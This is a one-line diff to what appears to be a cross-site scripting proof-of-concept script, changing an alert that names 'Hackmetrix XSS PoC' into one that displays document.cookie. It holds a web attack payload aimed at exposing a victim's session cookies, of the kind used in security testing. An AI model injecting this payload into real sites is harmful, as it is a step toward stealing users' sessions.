@@ -1,1 +1,1 @@
-alert("Hackmetrix XSS PoC");
+alert(document.cookie);
